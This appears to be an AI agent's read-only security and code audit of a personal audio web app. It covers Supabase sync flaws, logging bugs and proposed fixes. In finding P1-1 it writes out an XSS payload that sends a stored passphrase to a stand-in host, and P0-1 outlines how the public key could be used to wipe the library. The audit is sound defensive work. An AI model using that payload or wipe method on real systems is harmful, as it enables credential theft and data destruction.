# hype-audio-app — Code Audit (2026-09-29)

Read-only audit by the Dev (Fable) agent. No source file was changed; this document is the only file added.

## Scope and method

- Whole repo at `721f64e` (branch `mc/ce78c450`), 77 tracked files.
- Weighted toward the 9 commits since 2026-09-08: use_case/delivery_role tags (`2661efc`), Focus mode + cue sets (`89023b5`, `259f26a`, `3c92cf8`, `f251a0f`), rant capture (`6b1ce7c`), improve pass (`721f64e`).
- Static reading only. No installs, no network calls, no browser run.
- Self-checks run locally, all 7 pass:
  `hype-audio.selfcheck.js`, `hype-fetch-row-workout-dates.selfcheck.js`, `sw.selfcheck.js`, `sync.selfcheck.js`, `weekly-recap.selfcheck.js`, `api/create-content-idea.selfcheck.js`, `scripts/transcribe-carl-rants.selfcheck.py`.
- "Unverified" marks anything that depends on live Supabase policy, a real device, or the Row repo, none of which are visible from this repo.

## Summary

| Priority | Count | Theme |
|---|---|---|
| P0 | 1 | The production library row is writable with the public key and has no backup |
| P1 | 9 | Measurement data is wrong, sync can silently stop or lose fields, recent features leak into other pools |
| P2 | 16 | Edge cases, hardening, dead code, test and CI gaps |

---

## P0

### P0-1. The whole library is readable and writable with the key shipped in page source, and there is no backup or rollback

**Evidence**
- `supabase-config.js:6-7` ships the project URL and publishable key to every visitor.
- `sync.js:239-249` writes the full `app_state` row using only that key.
- `scripts/transcribe-carl-rants.py:18-20` states that anon has read/write on `key='hype-audio'` ("confirmed live").
- `docs/superpowers/specs/2026-08-17-rant-engine-design.md:39` quotes the policy: `"hype-audio anon access to app_state" roles:{anon} qual:(key = 'hype-audio')`.
- No snapshot, export, or versioning of the row exists anywhere in the repo. `sync.js:21-25` and `sync.js:117-127` record two real production wipes on 2026-07-25.

**Unverified:** the live RLS policy itself. No SQL, migrations, or policy files are in this repo, so this rests on the repo's own comments and spec.

**Failure scenario**
Anyone who opens https://hype-audio-app.vercel.app and reads the page source can:
1. GET the row and read every clip, including the full transcripts of Carl's personal rants.
2. POST the same array back with `deleted: true` and a far-future `updated_at` on every clip.

`mergeArrays` lets a tombstone beat any live copy (`sync.js:69-75`), so every device, including Row's mini-player, accepts the deletes and pushes them onward. There is nothing to restore from.

The same write access is the entry point for the XSS chain in P1-1, and for repointing `storage_url` at arbitrary audio that Row then auto-plays in the gym (`hype-audio.js:188`).

**Note:** single-user, passphrase-only is a deliberate design choice (`api/upload-clip.mjs:6-8`). The P0 rating comes from the combination: public write, tombstones that always win, and zero rollback.

---

## P1

### P1-1. Unescaped clip id in search results is an XSS sink that exposes the upload passphrase

**Evidence**
- `index.html:1511` builds `data-clip-id="' + c.id + '"` into `innerHTML` without `escapeHtml`. Title, pillar, mentality, and preview on the following lines are escaped.
- `hype-audio.js:823-833` stores the passphrase in plain text under `hype_audio_upload_secret` in `localStorage`.

**Failure scenario**
A clip whose `id` is `x"><img src=x onerror="fetch('//evil/'+localStorage.hype_audio_upload_secret)">` is written into the row (see P0-1). Carl searches for a word in its title. The handler runs and the passphrase is sent out. The passphrase gates service-role writes into the bucket and into `content_ideas` (`api/create-content-idea.mjs:92-97`), a table shared with the content pipeline.

### P1-2. Focus and cue plays are logged twice, can be logged when nothing played, and later clips in a Focus session carry no session id

**Evidence**
- `hype-audio.js:441-458`: `playSingle`'s `onplay` already logs a `play` event for every clip that actually starts.
- `index.html:680-681`: the cue button calls `playClip` and then logs a second `play`.
- `index.html:1600-1603`: Focus start calls `playRandomLoop` and then logs a second `play` with `sessionId`.
- `hype-audio.js:489-498`: every subsequent clip in the loop goes through `advance()` and is logged by `onplay` only, with `useCase`, `deliveryRole`, and `sessionId` all null.
- `hype-audio.js:433-439` documents why logging outside `onplay` is wrong: `play()` can reject with no audio starting.

**Failure scenario**
A 25-minute Focus session plays 8 clips. The log holds 9 `play` events: 2 for the first clip, 1 with a `sessionId`, and 7 with none. The weekly recap (`weekly-recap.js:55`, `:84`) over-counts plays. The 30-day Focus evaluation the spec calls for (`docs/superpowers/specs/2026-09-20-focus-mode-and-cue-sets-design.md:51`) cannot tie clips to sessions.

If autoplay is blocked, the explicit log still records a play that never happened.

### P1-3. Sync never recovers in a session that started offline

**Evidence**
- `sync.js:252-273`: the initial fetch runs once. On failure `initFailed` is set and `syncReady` stays `false`. Nothing retries it.
- `sync.js:166` and `sync.js:220`: `pushNow` and `flushOnUnload` both return early while `syncReady` is false.
- `sync.js:16`: if the supabase-js CDN script failed to load, `initCloudSync` returns before doing anything.
- `index.html:465`: that script comes from jsdelivr. `sw.js:66` only caches same-origin requests, so it is never available offline.

**Failure scenario**
Carl opens the PWA in a gym with no signal, plays clips, favorites two, and records a Focus outcome. Signal returns. The page is still the same session, so nothing is pushed and the indicator reads "Offline" indefinitely. If iOS evicts the PWA's storage before the next full reload with network, those edits are gone. No alert fires.

### P1-4. Last-write-wins is per whole clip, so an unrelated play on another device erases fields

**Evidence**
- `sync.js:76-83`: the entry with the newer `updated_at` replaces the other entirely. Fields are not merged.
- `hype-audio.js:454`: every play bumps `updated_at` through `updateClip`.
- `index.html:979`: `content_idea_sent` is a plain field on the clip.
- `api/create-content-idea.mjs:44-47`: on resend, the server returns the existing row's id and ignores the new title, hook, and pillar.

**Failure scenario**
1. Desktop sends a rant to Content Ideas. `content_idea_sent: true` is written at time T1.
2. Carl's phone, offline in the gym and holding the older copy, plays that rant at T2 > T1.
3. The phone reconnects. Its copy is newer and wins. `content_idea_sent` disappears.
4. The rant reappears in "rants ready for content". Carl edits the hook and resends. The server reports success and discards the edit.

The same mechanism drops `transcript_text`, `suggested_mentality`, and a confirmed `mentality` whenever the offline device's copy is newer. The `721f64e` fix covered only the script-to-device direction.

### P1-5. Maintenance scripts overwrite the entire `data` blob: events are dropped and concurrent changes are reverted

**Evidence**
- `scripts/transcribe-carl-rants.py:82-89` reads the row. `:130-134` runs Whisper for up to 180 seconds per clip. `:151-158` writes back `{"hype_audio": clips}` from the copy read at the start.
- `index.html:512` syncs two keys, `hype_audio` and `hype_audio_events`. The script writes only one, so the other is removed from the row.
- The same whole-blob write is in `scripts/bulk-upload-hype.js:73-76`, `scripts/replace-library.js:50-53`, `scripts/update-existing-clips.js:55-58`, `scripts/fix-broken-storage-urls.js:41-44`, `scripts/fix-double-prefix.js:53-56`, and `scripts/update-goggins-storage.js:40-43`.

**Failure scenario**
Carl runs the transcription script against 10 new rants, which takes several minutes. During the run he records another rant on his phone and it syncs. The script then writes its stale array. The remote row loses the new rant and every event.

A device that still holds the data locally will push it back on its next local write, so this usually self-heals. Anything held only remotely is lost, for example events from a device that has since been cleared.

### P1-6. Focus and cue clips leak into the hype pools, including Row's auto-play

**Evidence**
- Every upload and record form forces a `moment` with no blank option: `index.html:302-306`, `:340-344`, `:388-392`. The default is `pre_workout`.
- `hype-audio.js:61-71`: a filter that does not name `useCase` or `deliveryRole` matches clips with any value for them.
- `hype-audio.js:181-183`: the mid-set fallback pool is every clip in `iron`, `mindset`, or `carl`.
- `hype-audio.js:196-198`: the PR rant pool is every `carl` clip.
- Cues are recorded through the Carl-only record form (`index.html:1470`), so they are all `pillar: 'carl'`.

**Failure scenario**
Carl records a 20-second "Brace" cue. He hits a PR in Row. `playPrRant` draws from all `carl` clips and plays the cue instead of a rant.

Separately, a 10-minute brown-noise clip uploaded for Focus is tagged `pre_workout` by default and comes up in the home "Pre" loop and in its pillar's PLAY RANDOM.

**Unverified:** whether Row's vendored copy is current. It does not matter for this finding, because the leak is in the shared data.

### P1-7. State-mode buttons wait on the network for up to 3 seconds before starting audio, and a rejected `play()` is swallowed

**Evidence**
- `index.html:645-656`: the click handler awaits `hypeFetchRowPhase()` before `playRandomLoop`.
- `sync.js:323-332`: that call has a 3-second timeout.
- `hype-audio.js:484`: `audio.play().catch(function () {})`.

**Failure scenario**
On a weak gym signal, Carl taps "Heavy Day". Nothing happens for up to 3 seconds. On iOS the await may drop the tap's user-activation, so `play()` is rejected (unverified on device). The rejection is swallowed, `randomFilter` is already set, and the button shows "■ STOP" while nothing plays. No `onended` or `onerror` fires, so the loop never advances.

### P1-8. Suggested mentalities are hard to find, and unreachable on browsers without `MediaRecorder`

**Evidence**
- `index.html:372-414`: `mentality-review-list` sits inside the "Record a clip" `<details>`, which is collapsed by default and hidden outside Carl sections (`index.html:1071-1075`).
- `index.html:1340-1341`: the whole `<details>` is removed when recording is unsupported.
- `index.html:1012-1014`: `renderMentalityReview` returns when the list element is missing.
- `index.html:547-567`: the home screen has badges for title review and content ideas, none for mentality review.

**Failure scenario**
The script writes `suggested_mentality` on 12 blank-mentality rants. Nothing on the home screen says so. The rants stay "Untagged" and are excluded from every state mode until Carl opens a Carl section and expands "Record a clip". On a desktop browser with no microphone API the review list does not exist.

### P1-9. Focus session lifecycle: spec'd behavior is missing, the timer can stop unrelated audio, and outcomes can be mislabeled or lost

**Evidence**
- Spec: a dismissed panel is treated as Skip and logged (`docs/superpowers/specs/2026-09-20-focus-mode-and-cue-sets-design.md:27`). No handler exists for the `<details>` closing or for navigation. Outcomes are logged only from the three buttons at `index.html:1625-1627`.
- Spec: fade-out over the final 10 seconds (same file, `:25`). Built as a hard stop, acknowledged at `index.html:1578-1581`.
- `index.html:1582`: at timer end, `stopPlayback()` runs whenever the chosen sound was `audio`, regardless of what is playing.
- `index.html:1599-1606`: when no Focus clips exist the session continues silently, but `focusSound` stays `'audio'` and is logged that way at `index.html:1614-1619`.
- `index.html:1533-1537`: all session state is in memory.

**Failure scenarios**
1. Carl starts a 25-minute Audio session with no tagged clips and gets the "starting silent" alert. He starts a Goggins loop instead. At 25:00 the Focus timer stops it. The outcome is logged as `sound: 'audio'` for a session that had no Focus audio.
2. Carl starts a 50-minute session and the phone sleeps. iOS reloads the PWA on return. The session is gone and no outcome event exists.
3. Unverified on device: background timer throttling can let the audio loop run past the end time until the page is foregrounded.

---

## P2

### P2-1. "Untagged" sections misbehave because an empty mentality is falsy

- `index.html:1261-1262`, `:503-504`, `:518-519` branch on `if (currentMentality)`. In the Untagged section `currentMentality` is `''`, so these re-render the hidden subcategory view instead of the visible clip list.
- `index.html:1305-1306` passes `currentMentality` and ignores the Mentality input. `index.html:1275` then rejects the empty value.
- `index.html:1526` requires a truthy mentality before opening a search result.

**Scenario:** Carl plays a rant in Carl · Untagged. The row icon never changes to ⏸. Uploading from that section always fails with "Title and mentality are both required". Tapping an untagged rant in search does nothing.

### P2-2. Subcategory uploads take their tags from a different, hidden form

- `index.html:1290-1291` always reads `use-case-input` and `delivery-role-input`, which belong to the section form.
- `index.html:298-313`: the subcategory form has neither field.

**Scenario:** Carl picks "Study/focus" and "Noise" in a section form, does not submit, then uploads a Goggins speech from a subcategory screen. It is saved as Focus noise and plays in Focus sessions.

### P2-3. The now-playing explainer is wrong for Focus loops

- `hype-audio.js:683-694` exposes nothing for `useCase` or `deliveryRole`, so `explainQueuePick` reaches its last branch (`hype-audio.js:716`).

**Scenario:** during a Focus loop the bar reads "You picked this clip directly."

### P2-4. Cue lookup depends on an exact hand-typed key

- `index.html:662-665` and `:675`: the keys are `controlled_eccentric`, `final_rep`, `post_miss_reset`.
- `index.html:1469` only trims and lowercases what is typed.
- `index.html:677`: the alert says "use Record a clip below", but that form is in Carl sections, not on the home screen.

**Scenario:** Carl types "controlled eccentric" with a space. The button reports no cue recorded, permanently.

### P2-5. Storage-quota failures are unhandled on the write path

- `hype-audio.js:17-19`: `saveClips` has no try/catch.
- `index.html:1281-1295`: `addClip` runs after the upload succeeds.
- `sync.js:110`: a failed local apply of remote data is swallowed.

**Scenario:** the library with transcripts approaches the `localStorage` limit. An upload succeeds, `addClip` throws, the file is orphaned in Storage, and no message is shown. **Unverified:** current library size.

### P2-6. Every play pushes the entire library to Supabase

- `hype-audio.js:454-455`: a play writes both synced keys.
- `sync.js:55-58` and `:213`: that schedules a push after 250 ms.
- `sync.js:184-187`: the push is the whole state, which then fans out over realtime to every open device.

**Scenario:** a 30-clip loop makes 30 full-library uploads over gym cellular, and 30 full-row broadcasts. **Unverified:** whether the row is near Supabase's realtime payload limit. If it is exceeded, `sync.js:278` returns early and live sync stops without notice.

### P2-7. Event pruning does not converge across devices

- `hype-audio.js:774-786` prunes by age and count locally.
- `sync.js:63-86` merges as a union, so pruned events return from any device or row that still has them.

**Scenario:** once events pass 90 days, two devices keep re-adding and re-pruning each other's old events, with an extra full push each cycle.

### P2-8. Deleting a clip leaves its audio publicly downloadable

- `hype-audio.js:44-50` only writes a tombstone. Nothing in the app deletes from Storage.
- `index.html:1184` tells the user the delete cannot be undone.

**Scenario:** Carl deletes a personal rant. The public URL keeps serving it.

### P2-9. API endpoint hardening

- `api/upload-clip.mjs:31` and `api/create-content-idea.mjs:92`: passphrase compared with `!==`, no rate limit.
- `api/upload-clip.mjs:49` and `api/create-content-idea.mjs:97`: `SUPABASE_SERVICE_ROLE_KEY` is not checked, unlike the passphrase, and there is no try/catch around the handler body.
- `api/upload-clip.mjs:36-44`: no server-side size limit. The 25 MB cap at `hype-audio.js:843` is client-only.
- `api/create-content-idea.mjs:29-39`: no length limits on title, hook, body, or `sourceStorageUrl`.
- `api/create-content-idea.mjs:15-22`: the lookup discards its `error`.

**Scenario:** the service-role env var is missing after a Vercel change. Both endpoints return an unexplained 500 and the client shows "Failed (500)."

### P2-10. Transcription script failure modes

- `scripts/transcribe-carl-rants.py:130-134`: `TimeoutExpired` and a missing `whisper` binary are uncaught, the return code is ignored, and stderr is captured and dropped.
- `:158`: the final write is unhandled.
- `:101-106` with `:145-146`: a clip whose transcript is empty stays in `missing`, so every run bumps its `updated_at` again on a stale copy.

**Scenario:** one long rant exceeds 180 seconds. The script crashes before the push. Finished transcripts are cached on disk, but nothing reaches the app until a rerun.

### P2-11. Weekly recap compares UTC play dates with Row's session dates

- `weekly-recap.js:17-19` derives the play's date with `toISOString()`, which is UTC.
- `weekly-recap.js:103` parses Row's date keys as local noon.

**Scenario:** a play at 9 pm Eastern is filed under the next day and misses the training day it happened on. **Unverified:** Row's date-key format.

### P2-12. Service worker gaps

- `sw.js:27-37`: the audio cache is never pruned. Re-uploaded clips (`_v2`, `_full`) leave the old file cached.
- `sw.js:53-59`: no precache on install and no cleanup of old cache versions on activate.
- `sw.js:39-50`: network-first has no timeout.

**Scenario:** on a connection that stalls instead of failing, the app shell hangs until the browser's own timeout, although a cached copy exists.

**Unverified:** `sw.js:20-25` answers Range requests with a full 200 response. Safari's handling of that for media is not confirmable from code.

### P2-13. A new Supabase client is created on every Row fetch

- `sync.js:308` and `sync.js:325`.

**Scenario:** each state-mode tap and each recap open adds another client, which is the source of the multi-client warnings noted in `.claude/skills/verify/SKILL.md`.

### P2-14. Dead and stale code and docs

- One-off scripts still in the repo and still runnable against production: `scripts/fix-double-prefix.js` (described as buggy in `scripts/fix-broken-storage-urls.js:1-8`), `scripts/replace-library.js:49-53` (replaces the whole library), `scripts/update-existing-clips.js:13` (reads a hardcoded temp path at load).
- `sync.js:1-5`: header still tells the reader to paste in placeholders.
- `README.md:4`: lists only the `iron` and `faith` pillars.
- References to specs that are not in the repo: `hype-audio.js:180`, `hype-audio.js:682`, `weekly-recap.js:13`.
- `supabase-config.js:1-4` claims to be the single source of truth, but the URL and key are repeated in both API files, six JS scripts, and `scripts/transcribe-carl-rants.py:29-30`.
- `isPlayingRandom` (`hype-audio.js:285`) has no caller in this repo. **Unverified:** Row may use it.
- The two export lists differ (`hype-audio.js:927-977` and `:981-1023`). `sendToContentIdea` and `togglePlay` are not exported for Node.

**Scenario:** someone reruns `replace-library.js` to republish clips. The remote library is replaced by the manifest, and play counts, favorites, transcripts, and recorded rants are removed from the row.

### P2-15. Test, CI, and monitoring gaps

- `package.json:1-7` has no `test` script. There is no CI config. The 7 self-checks are run by hand.
- No automated coverage for anything inline in `index.html`: Focus mode, cue buttons, Content Ideas screen, mentality review.
- `sendToContentIdea` (`hype-audio.js:894-924`) has no test, and cannot have one in Node until it is exported.
- `api/upload-clip.mjs` has no self-check.
- The only failure signal is the sync label on the home screen (`index.html:255`) and `console.error` in Vercel logs (`api/upload-clip.mjs:55`, `api/create-content-idea.mjs:71`).
- **Unverified:** whether Row's hand-copied `hype-audio.js` matches this repo after `721f64e`.

**Scenario:** a change breaks a self-check that nobody runs, and it ships.

### P2-16. Search leaves the newer home rows on screen

- `index.html:1496-1506` hides only `tiles` and `moment-row`. `state-mode-row`, `cues-row`, and the Focus panel stay visible under the results.

**Scenario:** Carl searches, scrolls past the results, and taps a cue button he did not mean to reach.

---

## Ranked improvements

1. **Back up the `app_state` row.** A scheduled export or a history table. This turns P0-1, P1-5, and any future wipe from permanent into recoverable. Needs Carl's decision on where it runs, and must stay on free tier.
2. **Escape `c.id` in search results** (P1-1). One line, closes the only XSS sink found.
3. **Log plays in one place only** (P1-2). Pass `extra` through the playback path so `onplay` records `useCase`, `deliveryRole`, and `sessionId`, and remove the two explicit calls. Do this before the 30-day Focus window collects more bad data.
4. **Retry the initial sync fetch** (P1-3) on the `online` event and on return to foreground.
5. **Make scripts preserve the rest of the blob** (P1-5). Re-read just before writing and write `{...data, hype_audio: clips}`.
6. **Keep Focus and cue clips out of hype pools** (P1-6). Exclude the non-speech and cue delivery roles from pools that did not ask for them. This changes `hype-audio.js`, so Row's copy needs a re-sync.
7. **Play first, fetch phase second** (P1-7). Start the loop inside the tap and apply the phase to later picks.
8. **Add a home badge for pending mentality reviews** and move the list out of the record panel (P1-8).
9. **Finish the Focus lifecycle** (P1-9). Only stop audio the session started, log the real sound, persist the session so a reload can still record an outcome.
10. **Decide on field-level merge for clips** (P1-4). Larger change, touches the sync contract shared with Row. Needs Carl's call.
11. **Add `npm test`** that runs all self-checks (P2-15).
12. **Archive the one-off scripts** (P2-14).
13. The remaining P2 items, in the order listed.

## Task candidates

Each is a single-file change with a clear done-condition.

| # | File | Change | Fixes |
|---|---|---|---|
| 1 | `index.html` | Wrap `c.id` in `escapeHtml` at line 1511 | P1-1 |
| 2 | `index.html` | Remove the explicit `logHypeEvent('play', …)` in the cue handler (line 681) | P1-2 (cue half) |
| 3 | `hype-audio.js` | Let `playRandomLoop` and `playClip` accept event extras that `onplay` logs for every clip in the session, with self-check coverage | P1-2 (Focus half, step 1) |
| 4 | `index.html` | After task 3: pass the extras from Focus start and drop the explicit log at line 1602 | P1-2 (Focus half, step 2) |
| 5 | `sync.js` | Retry the init fetch on `online` and `visibilitychange`, clear `initFailed` on success | P1-3 |
| 6 | `scripts/transcribe-carl-rants.py` | Re-fetch before the write, merge by clip id, keep all other keys in `data`, extend the Python self-check | P1-5 |
| 7 | `index.html` | In the state-mode handler, start playback before awaiting the phase | P1-7 |
| 8 | `index.html` | Add a home link with the pending mentality-review count, and move `mentality-review-list` outside `record-clip-details` | P1-8 |
| 9 | `index.html` | Focus: track whether the session started audio, stop only that, log `sound: 'silence'` when nothing played | P1-9 |
| 10 | `index.html` | Focus: log `skip` when the panel closes or the view changes with an outcome pending | P1-9 |
| 11 | `index.html` | Replace `if (currentMentality)` with a `!== null` check at lines 503, 518, 1261, and allow empty mentality at 1526 | P2-1 |
| 12 | `index.html` | `submitClip` takes use case and delivery role as arguments instead of reading fixed element ids | P2-2 |
| 13 | `hype-audio.js` | Add `useCase` to `getPlaybackContext` and a matching branch in `explainQueuePick`, with self-check | P2-3 |
| 14 | `index.html` | Normalize spaces to underscores in the record form's mentality, and correct the cue alert wording | P2-4 |
| 15 | `hype-audio.js` | Guard `saveClips` against quota errors and return a success flag | P2-5 |
| 16 | `api/create-content-idea.mjs` | Check `SUPABASE_SERVICE_ROLE_KEY`, wrap the handler in try/catch, cap field lengths, extend the self-check | P2-9 |
| 17 | `api/upload-clip.mjs` | Same env check and try/catch | P2-9 |
| 18 | `scripts/transcribe-carl-rants.py` | Catch `TimeoutExpired` and missing binary per clip, print Whisper's stderr, skip empty transcripts | P2-10 |
| 19 | `weekly-recap.js` | Use local dates in `dateKey`, once Row's key format is confirmed | P2-11 |
| 20 | `sync.js` | Reuse one Supabase client for the two Row fetch helpers | P2-13 |
| 21 | `package.json` | Add a `test` script that runs all 7 self-checks | P2-15 |
| 22 | `README.md` | Update the pillar list and document how to run the self-checks | P2-14 |
| 23 | `index.html` | Hide `state-mode-row`, `cues-row`, and the Focus panel while search results are showing | P2-16 |

**Not single-file, need Carl's decision first:** the `app_state` backup (P0-1), excluding Focus and cue clips from hype pools with a Row re-sync (P1-6), field-level merge (P1-4), and deleting Storage objects on clip delete (P2-8).
